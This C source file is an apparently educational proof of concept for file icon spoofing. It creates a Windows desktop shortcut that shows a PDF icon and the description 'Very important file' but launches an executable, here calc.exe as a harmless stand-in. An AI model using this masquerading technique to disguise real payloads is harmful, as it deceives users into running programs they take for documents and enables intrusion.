/*
>* File Icon Spoofing (PDF) *<

@author:  bekoo 
@website: 0xbekoo.github.io
@warning: This project has been developed for educational purposes only. Its use in real scenarios is at one's own risk. 

*/

#include <stdio.h>
#include <strsafe.h>
#include <wchar.h>
#include <ShlObj.h>
#include <objbase.h>
#include <Windows.h>

BOOL CreateShortcut( const wchar_t* TargetPath, 
                     const wchar_t* ShortcutPath, 
                     const wchar_t* IconPath ) {
    HRESULT         HRES; 
    IShellLink*     PSL = NULL;
    IPersistFile*   PPF = NULL;

    CoInitialize(NULL); 
    
    HRES = CoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, &IID_IShellLink, (void**)&PSL);
    if (FAILED(HRES)) {
        wprintf(L"Failed to create IShellLink Object! Error Code:  0x%08X\n", HRES);
        return 1;
    }
    PSL->lpVtbl->SetPath(PSL, TargetPath);                      /*  Target Path  */
    PSL->lpVtbl->SetIconLocation(PSL, IconPath, 0);             /*  Icon Path    */
    PSL->lpVtbl->SetDescription(PSL, L"Very important file");   /*  Description  */

    HRES = PSL->lpVtbl->QueryInterface(PSL, &IID_IPersistFile, (void**)&PPF);
    if (FAILED(HRES)) {
        wprintf(L"Failed to interface! Error Code: 0x%08X\n", HRES);
        return 1;
    }
    HRES = PPF->lpVtbl->Save(PPF, ShortcutPath, TRUE);
    PPF->lpVtbl->Release(PPF);
    PSL->lpVtbl->Release(PSL);
    CoUninitialize();

    wprintf(L"Shortcut Created!\n");
    return 0;
}

int main()
{
    
    wchar_t ShortcutPath[MAX_PATH];
    HRESULT HRFolder;
    /*
        In this section, add the icon path for the shortcut to be created.

        If you do not have any .ico file, you can download the pdf icon file I attached as an example 
        and give the path.
    */
    wchar_t IconPath[MAX_PATH]      = L"C:\\path\\to\\icofile";
    wchar_t TargetPath[MAX_PATH]    = L"C:\\Windows\\System32\\calc.exe";

    
    HRFolder = SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, ShortcutPath);
    if (FAILED(HRFolder)) {
        wprintf(L"Failed to get Desktop Path! Error Code: 0x%08X\n", HRFolder);
        return 1;
    }
    StringCchCatW(ShortcutPath, MAX_PATH, L"\\Projects.lnk");
    wprintf(L"Merged Path: %s\n", ShortcutPath);
    
    if (CreateShortcut(TargetPath, ShortcutPath, IconPath) > 0) {
        wprintf(L"Failed to create Shortcut!\n");
        return -1;
    }
    return 0;
}